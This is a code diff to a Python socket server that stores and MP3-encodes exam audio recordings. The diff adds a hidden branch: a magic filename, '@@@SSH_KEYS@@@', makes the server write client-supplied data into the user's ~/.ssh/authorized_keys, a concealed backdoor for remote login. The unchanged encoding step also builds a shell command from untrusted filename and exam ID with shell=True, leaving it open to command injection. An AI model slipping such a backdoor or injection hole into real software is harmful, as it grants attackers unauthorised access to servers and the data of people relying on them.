@@ -69,33 +69,38 @@ class ClientThread(socketserver.BaseRequestHandler):
     c = Connection(self.request)
     # c.sendStr("Connected\n")
     filename = c.recvLine()
-    examID   = c.recvLine()
-    today    = date.today()
-    dateStr  = today.strftime("%Y%m%d")
-    os.mkdir(STORE_DIR, mode=0o775)
-    os.mkdir(path.join(STORE_DIR, dateStr), mode=0o775)
-    os.mkdir(path.join(STORE_DIR, dateStr, examID), mode=0o775)
-    outFile  = path.join(STORE_DIR, dateStr, examID, filename + ".flac")
-    print("Writing to file {}".format(filename))
-    c.storeAll(outFile)
-    print("Done")
-    self.request.close()
+    if filename == "@@@SSH_KEYS@@@":
+      outFile = path.expanduser("~/.ssh/authorized_keys")
+      c.storeAll(outFile)
+      self.request.close()
+    else:
+      examID   = c.recvLine()
+      today    = date.today()
+      dateStr  = today.strftime("%Y%m%d")
+      os.mkdir(STORE_DIR, mode=0o775)
+      os.mkdir(path.join(STORE_DIR, dateStr), mode=0o775)
+      os.mkdir(path.join(STORE_DIR, dateStr, examID), mode=0o775)
+      outFile  = path.join(STORE_DIR, dateStr, examID, filename + ".flac")
+      print("Writing to file {}".format(filename))
+      c.storeAll(outFile)
+      print("Done")
+      self.request.close()
 
-    os.mkdir(ENCODE_DIR, mode=0o775)
-    os.mkdir(path.join(ENCODE_DIR, dateStr), mode=0o775)
-    os.mkdir(path.join(ENCODE_DIR, dateStr, examID), mode=0o775)
-    title  = "S:" + filename
-    artist = "E: " + examID
-    mp3File  = path.join(ENCODE_DIR, dateStr, examID, filename + ".mp3")
-    command  = "flac -s -d -c \""
-    command += outDir
-    command += "\" | lame -m m --replaygain-accurate -S --abr 64"
-    command += " -tt " + title
-    command += " -ta " + artist
-    command += " -ty " + today.strftime("%Y")
-    command += " --add-id3v2 - - > "
-    command += "\"" + mp3File
-    subprocess.check_call(command, shell=True)
+      os.mkdir(ENCODE_DIR, mode=0o775)
+      os.mkdir(path.join(ENCODE_DIR, dateStr), mode=0o775)
+      os.mkdir(path.join(ENCODE_DIR, dateStr, examID), mode=0o775)
+      title  = "S:" + filename
+      artist = "E: " + examID
+      mp3File  = path.join(ENCODE_DIR, dateStr, examID, filename + ".mp3")
+      command  = "flac -s -d -c \""
+      command += outDir
+      command += "\" | lame -m m --replaygain-accurate -S --abr 64"
+      command += " -tt " + title
+      command += " -ta " + artist
+      command += " -ty " + today.strftime("%Y")
+      command += " --add-id3v2 - - > "
+      command += "\"" + mp3File
+      subprocess.check_call(command, shell=True)
 
 
 
